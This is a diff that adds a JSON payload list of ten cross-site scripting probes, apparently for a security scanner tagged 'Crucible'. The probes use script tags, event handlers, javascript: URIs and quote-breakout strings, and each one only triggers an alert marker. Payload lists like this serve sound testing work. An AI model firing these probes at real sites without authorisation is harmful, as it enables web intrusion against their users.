@@ -1,0 +1,14 @@
+{
+  "payload": [
+    "<script>alert('Crucible-XSS')</script>",
+    "<img src=x onerror=alert('Crucible-XSS')>",
+    "<svg onload=alert('Crucible-XSS')>",
+    "';alert('Crucible-XSS');//",
+    "\"><script>alert('Crucible-XSS')</script>",
+    "'-alert('Crucible-XSS')-'",
+    "<details open ontoggle=alert('Crucible-XSS')>",
+    "<iframe src=\"javascript:alert('Crucible-XSS')\"></iframe>",
+    "<body onload=alert('Crucible-XSS')>",
+    "<marquee onstart=alert('Crucible-XSS')>"
+  ]
+}
